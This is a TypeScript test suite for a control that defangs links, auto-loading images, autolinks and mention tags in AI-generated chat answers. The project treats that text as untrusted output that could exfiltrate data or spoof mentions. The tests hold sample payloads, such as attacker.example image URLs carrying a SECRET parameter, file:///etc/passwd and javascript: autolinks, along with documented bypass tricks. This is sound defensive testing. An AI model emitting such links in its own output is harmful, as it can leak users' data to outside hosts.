/**
 * Tests for neutralize-links.ts — the control added for AppSec finding 32c8dabb.
 *
 * The property under test: MODEL-generated answer text renders into CardKit
 * `markdown` elements, and by the project's threat model (T5) that text is untrusted
 * model output derived from untrusted repository content. Clickable links, auto-loading
 * images and spoofed mentions are therefore an exfiltration / spoofing channel whose
 * audience is the whole chat. These tests lock: the clickability is removed, the
 * information is NOT, and fenced code is left byte-for-byte alone.
 */

import { neutralizeModelLinks } from "../src/neutralize-links";
import { sanitizeAnswerText, renderFinalText, MAX_CARD_BODY_CHARS } from "../src/sanitize-answer";

describe("neutralizeModelLinks", () => {
  it("demotes a markdown link to text while KEEPING both the label and the URL", () => {
    const out = neutralizeModelLinks("详见 [Config.cs:42](https://code.amazon.com/packages/X/blobs/a/--/Config.cs#L42) 的定义。");
    expect(out).not.toContain("](");
    expect(out).toContain("Config.cs:42");
    // The URL must survive: the 供研发复核 panel legitimately cites code URLs and a
    // reviewer has to be able to read them.
    expect(out).toContain("https://code.amazon.com/packages/X/blobs/a/--/Config.cs#L42");
  });

  it("strips the image marker so an attacker-controlled URL can never be auto-loaded", () => {
    // This is the no-interaction case: the finding could not determine whether CardKit
    // auto-loads ![](url). We degrade images unconditionally so the answer to that
    // question does not change our exposure.
    const out = neutralizeModelLinks("![看图](https://attacker.example/p?q=SECRET)");
    expect(out).not.toContain("![");
    expect(out).toContain("图片已移除");
    expect(out).toContain("https://attacker.example/p?q=SECRET");
  });

  it("removes a model-emitted Feishu mention tag", () => {
    // The ASKER's mention is emitted by the composer in its own element from a
    // platform-supplied open_id; that argument does not transfer to an id the MODEL
    // emitted, which is what this strips.
    const out = neutralizeModelLinks('请 <at id="ou_abcdef0123456789">@张三</at> 确认。');
    expect(out).not.toContain("<at");
    expect(out).not.toContain("</at>");
    expect(out).toContain("@张三"); // the visible text stays, only the tag goes
  });

  it("neutralizes a bare autolink", () => {
    const out = neutralizeModelLinks("参考 <https://attacker.example/x> 。");
    expect(out).not.toContain("<https://");
    expect(out).toContain("https://attacker.example/x");
  });

  it("leaves FENCED CODE byte-for-byte alone", () => {
    // Product requirement, not a concession: answers quote source, and quoted source
    // can legitimately contain [x](y) — a markdown file in the repo, a link in a
    // comment. Rewriting inside a fence would corrupt the artifact the user asked for,
    // and a fence is not clickable in the first place.
    const fenced = ["前言。", "```md", "见 [README](https://example.com/readme)", "![img](https://example.com/i.png)", "```", "结语。"].join("\n");
    const out = neutralizeModelLinks(fenced);
    expect(out).toContain("[README](https://example.com/readme)");
    expect(out).toContain("![img](https://example.com/i.png)");
    // …while prose OUTSIDE the fence is still processed.
    const mixed = neutralizeModelLinks(`${fenced}\n[点我](https://attacker.example/y)`);
    expect(mixed).toContain("[README](https://example.com/readme)"); // inside fence
    expect(mixed).not.toContain("[点我](");                            // outside fence
  });

  it("an autolink cannot survive by padding its URL past a length bound", () => {
    // AUTOLINK_RE was `{1,2000}`. A longer URL made it miss, and the postcondition sweep covered
    // only `![` / `](` — so the autolink passed through clickable. The fast-path discriminator
    // still fired, so execution reached the transform and simply found nothing to do.
    const long = `https://evil.example/${"a".repeat(3000)}`;
    const out = neutralizeModelLinks(`看这里 <${long}> 结束`);
    expect(out).not.toContain(`<${long}>`);
    // No `<scheme://` may survive in any form: an autolink needs the matched pair to render.
    expect(out).not.toMatch(/<[a-z][a-z0-9+.-]*:\/\//i);
    // The URL text itself is preserved — this neutralizes, it does not censor.
    expect(out).toContain(long);
  });

  it("an at-tag cannot survive by padding its attributes past a length bound", () => {
    // AT_TAG_RE was `[^>]{0,300}`. Padding the attribute run made it miss, leaving a live and
    // spoofable mention in text rendered as CardKit markdown.
    const pad = "x".repeat(900);
    const out = neutralizeModelLinks(`<at id="all" data-pad="${pad}">全体</at> 你好`);
    expect(out).not.toMatch(/<\/?at\b/i);
    expect(out).toContain("你好");
  });

  it("the sweep covers every construct the transform handles, not just links and images", () => {
    // One input carrying all four shapes past their old bounds at once. Nothing clickable or
    // mention-shaped may come out.
    const longUrl = `ftp://host.example/${"b".repeat(2500)}`;
    const input = [
      `![img](https://x.example/${"c".repeat(2600)})`,
      `<${longUrl}>`,
      `<at id="here" ${"d".repeat(400)}>`,
      `[label](https://y.example/${"e".repeat(2600)})`,
    ].join("\n");
    const out = neutralizeModelLinks(input);
    expect(out).not.toContain("](");
    expect(out).not.toMatch(/!\[/);
    expect(out).not.toMatch(/<[a-z][a-z0-9+.-]*:\/\//i);
    expect(out).not.toMatch(/<\/?at\b/i);
  });

  it.each([
    ["gopher", "<gopher://evil.example/x>"],
    ["file", "<file:///etc/passwd>"],
    ["ws", "<ws://evil.example/socket>"],
    // AUTHORITY-LESS forms. These are the ones that matter most and the ones the first version of
    // this test missed: it used a fabricated `<data://…>` with slashes, so the probe's `://`
    // requirement was never exercised. A genuine data URI has no slashes, and neither does mailto:
    // or tel: — all three are valid CommonMark autolinks and render clickable.
    ["mailto (no //)", "<mailto:victim@evil.example>"],
    ["data (real form, no //)", "<data:text/html;base64,PHNjcmlwdD4=>"],
    ["tel (no //)", "<tel:+15551234>"],
    ["javascript (no //)", "<javascript:alert(1)>"],
  ])("neutralizes a %s autolink even though the transform only rewrites http/ftp", (_name, input) => {
    // The sweep was widened to any scheme, but the FAST PATH still tested only https/ftp — so a text
    // whose only clickable construct used another scheme returned verbatim and the sweep never ran.
    // Both layers now read the same constant, and that constant matches on the colon rather than
    // `://`, because the authority is optional in CommonMark.
    const out = neutralizeModelLinks(`看这个 ${input} 就这样`);
    expect(out).not.toContain(input);
    expect(out).not.toMatch(/<[a-z][a-z0-9+.-]*:/i);
    // Surrounding prose is untouched.
    expect(out).toContain("看这个");
    expect(out).toContain("就这样");
  });

  it("is a no-op on text with nothing clickable", () => {
    const plain = "结论：攻击力上限 999。见 Config.cs:42。";
    expect(neutralizeModelLinks(plain)).toBe(plain);
  });

  it("is idempotent, having actually transformed the input on the first pass", () => {
    // The first assertion is what makes this test real. An earlier version asserted ONLY
    // `f(f(x)) === f(x)`, which a mutation run proved vacuous: the identity function
    // `(t) => t` satisfies it trivially, so the test passed with neutralization removed
    // entirely. Pinning the intermediate value proves work happened, THEN proves it settles.
    const once = neutralizeModelLinks("[a](https://x.example/1)");
    expect(once).toBe("a（https://x.example/1）");
    expect(neutralizeModelLinks(once)).toBe(once);
  });

  // Every case below is a bypass found by adversarial review of the first implementation.
  it("neutralizes an ftp:// autolink (fast-path discriminator must match the transform)", () => {
    // AUTOLINK_RE accepted ftp from the start, but the fast path tested only https?, so this
    // returned before the regex ran — a construct the module claimed to handle, silently passing.
    expect(neutralizeModelLinks("参考 <ftp://attacker.example/x> 。"))
      .toBe("参考 （ftp://attacker.example/x） 。");
  });

  it("removes a closing-only </at> tag", () => {
    // `<at\b` does not match `</at`, so the fast path skipped it while AT_TAG_RE would have.
    expect(neutralizeModelLinks("before </at> after")).toBe("before  after");
  });

  it("leaves no valid image syntax when an image is NESTED inside a link", () => {
    // One pass over `[![a](i.png)](u)` captured `![a` as the LABEL and produced
    // `![a（i.png）](u)` — itself a VALID markdown image pointing at `u`. A single-pass
    // regex therefore converted a nested construct into a live one, defeating the
    // unconditional image rule. Bounded iteration plus the postcondition sweep fixes it.
    const out = neutralizeModelLinks("[![a](i.png)](u)");
    expect(out).toBe("[图片已移除：a（i.png）]（u）");
    // The invariant that actually matters, asserted structurally rather than by example:
    expect(out).not.toMatch(/!\[/);
    expect(out).not.toContain("](");
  });

  it("does NOT exempt the rest of the answer when a fence is never closed", () => {
    // FENCE_RE originally accepted `$` as a terminator, so an unclosed fence put every
    // following construct inside the exemption, all the way to EOF.
    const out = neutralizeModelLinks(
      'a [x](https://safe)\n```md\n[f](https://attacker/f)\nc [q](https://attacker/rest)',
    );
    expect(out).not.toContain("](");
    expect(out).toContain("q（https://attacker/rest）");
  });

  it("still exempts a properly CLOSED fence, so quoted source survives verbatim", () => {
    // The exemption exists because this product's whole job is showing source, which
    // legitimately contains markdown. Closing the fence keeps that guarantee.
    const src = "a [x](https://u)\n```md\n[f](https://in)\n```\nb [y](https://v)";
    const out = neutralizeModelLinks(src);
    expect(out).toContain("[f](https://in)"); // untouched inside the fence
    expect(out).toContain("x（https://u）");   // neutralized before it
    expect(out).toContain("y（https://v）");   // and after it
  });

  it("is linear on adversarial input (no ReDoS)", () => {
    // Answer text is model-authored from indexed repo content and the live typewriter
    // re-runs the whole accumulated string every throttle tick, so a quadratic pattern
    // here would be a remotely reachable stall of the single-threaded event loop.
    //
    // MEASURES GROWTH, not a wall-clock ceiling. The first version asserted only
    // `< 1000ms` per input, which the measured cost (≈0.02–12ms) clears by ~80×: it can
    // catch a multi-second catastrophic regex but says nothing about scaling, and an
    // identity implementation passes it. Comparing 1× against 4× input size is what
    // actually distinguishes linear from quadratic — quadratic would show ≈16×.
    // A generous absolute ceiling is kept as a separate hang guard.
    const shapes = (n: number) => [
      "[".repeat(n),
      "![".repeat(n / 2),
      `${"(".repeat(n / 2)}](`,
      "<at ".repeat(n / 4),
      "```\n".repeat(n / 8),
    ];
    const timeAll = (n: number): number => {
      const inputs = shapes(n);
      for (const s of inputs) neutralizeModelLinks(s); // warm up JIT + regex caches
      const t0 = process.hrtime.bigint();
      for (const s of inputs) neutralizeModelLinks(s);
      return Number(process.hrtime.bigint() - t0) / 1e6; // ms
    };
    const small = Math.max(timeAll(10000), 0.05); // floor: avoid dividing by timer noise
    const large = timeAll(40000);
    // Linear would be ≈4×; quadratic ≈16×. 8× leaves room for cache effects on a loaded
    // box while still failing a genuinely superlinear pattern.
    expect(large / small).toBeLessThan(8);
    // Hang guard, deliberately loose — a catastrophic regex blows straight past this.
    expect(large).toBeLessThan(2000);
  });
});

describe("integration: both card sinks are covered", () => {
  it("live body and live evidence are both neutralized", () => {
    const answer = [
      "结论：见 [恶意](https://attacker.example/a?d=1)。",
      "> 🔍 **供研发复核**",
      "> Config.cs:1 ![x](https://attacker.example/b)",
    ].join("\n");
    const out = sanitizeAnswerText(answer, { mode: "live" });
    expect(out.body).not.toContain("](");
    expect(out.evidence).not.toContain("![");
    // URLs are preserved as readable text in both.
    expect(out.body).toContain("https://attacker.example/a?d=1");
    expect(out.evidence).toContain("https://attacker.example/b");
  });

  it("the finalize terminal render neutralizes too", () => {
    const out = renderFinalText('见 [x](https://attacker.example/c) 与 <at id="ou_0123456789ab">@a</at>', MAX_CARD_BODY_CHARS);
    expect(out).not.toContain("](");
    expect(out).not.toContain("<at");
  });

  it("neutralisation runs BEFORE redaction (order contract #4) so it cannot re-join a secret past the redactor", () => {
    // The rewrite changes character adjacency, which is the property contract #2 exists
    // to protect. The `<at …>` tag is the case that matters: it is DELETED outright (a
    // link rewrite keeps its label and URL, so it does not re-join anything), so a secret
    // split by one becomes contiguous only after neutralisation. Assert it is still
    // redacted — i.e. redaction genuinely runs last.
    const head = "SuPerSecret";
    const tail = "Value0123456789ABCDEFghij";
    const out = sanitizeAnswerText(`值是 ${head}<at id="ou_0123456789abcdef">${tail} 完毕。`, { mode: "live" });
    expect(out.body).not.toContain(head + tail);
    expect(out.body).toContain("[已隐藏]");

    // Oracle: with neutralisation AFTER redaction the re-joined secret would survive.
    const { redactSensitive } = require("../src/redact");
    const inverted = neutralizeModelLinks(redactSensitive(`${head}<at id="ou_0123456789abcdef">${tail}`));
    expect(inverted).toContain(head + tail);
  });
});

describe("neutralizeModelLinks does not corrupt legitimate text", () => {
  // These are regressions, not hypotheticals. The version that matched an autolink on a bare
  // `<scheme:` prefix — no closing `>` required, a one-character scheme accepted — rewrote all of
  // them. For a product whose answers are mostly code, silently mangling `if a<b:` is a real defect.
  it.each([
    ["python comparison", "if a<b: pass"],
    ["annotated comparison", "assert x<y: 边界检查"],
    ["prose with a colon after a bracket", "见 <Note: 附录三>"],
    ["single-character scheme is not a scheme", "取 v<t: 的那一支"],
  ])("leaves %s untouched", (_name, input) => {
    // Nothing here is a CommonMark autolink: a scheme is 2-32 characters AND the `>` is mandatory.
    expect(neutralizeModelLinks(input)).toBe(input);
  });

  it("leaves an index-then-call expression alone inside an inline code span", () => {
    // `[i](x)` reads as a markdown link to LINK_RE, so this one is the TRANSFORM over-matching, not
    // the sweep. Tightening the sweep cannot reach it — only the code-span exemption can.
    const input = "调用 `arr[i](x)` 即可";
    expect(neutralizeModelLinks(input)).toBe(input);
  });

  it("leaves comparison operators alone inside an inline code span", () => {
    const input = "写成 `while (i<n: ok)` 的形式";
    expect(neutralizeModelLinks(input)).toBe(input);
  });

  it("still neutralizes a real link that sits OUTSIDE a code span in the same line", () => {
    // The exemption must be scoped to the span, not to any line containing one.
    const out = neutralizeModelLinks("看 `arr[i](x)` 和 [点我](https://attacker.example/y)");
    expect(out).toContain("`arr[i](x)`");   // span verbatim
    expect(out).not.toContain("[点我](");    // link outside it neutralized
  });

  it("does not let an UNCLOSED backtick exempt the rest of the answer", () => {
    // The same hole FENCE_RE had: honouring an unterminated opener hands a model a one-character
    // way to disable the whole module for everything that follows.
    const out = neutralizeModelLinks("开头 ` 然后 [点我](https://attacker.example/y) 结束");
    expect(out).not.toContain("[点我](");
  });

  it("still neutralizes an authority-less autolink, which now happens in the transform", () => {
    // Coverage for these used to depend on the loose sweep probe. It now comes from AUTOLINK_RE
    // itself, so tightening the sweep did not give it up.
    for (const input of ["<mailto:victim@evil.example>", "<tel:+15551234>", "<data:text/html,x>"]) {
      const out = neutralizeModelLinks(`看 ${input} 就这样`);
      expect(out).not.toContain(input);
      expect(out).not.toMatch(/<[a-z][a-z0-9+.-]{1,31}:/i);
    }
  });

  it("keeps the sweep effective on the ONE case the bound gives up on", () => {
    // The sweep's remaining job: a construct whose interior runs past AUTOLINK_RE's 2000-char bound.
    // Everything shorter is the transform's business, and prose can no longer trip this.
    const long = `https://evil.example/${"a".repeat(2500)}`;
    const out = neutralizeModelLinks(`看这里 <${long}> 结束`);
    expect(out).not.toContain(`<${long}>`);
    expect(out).toContain(long); // neutralized, not censored
  });
});
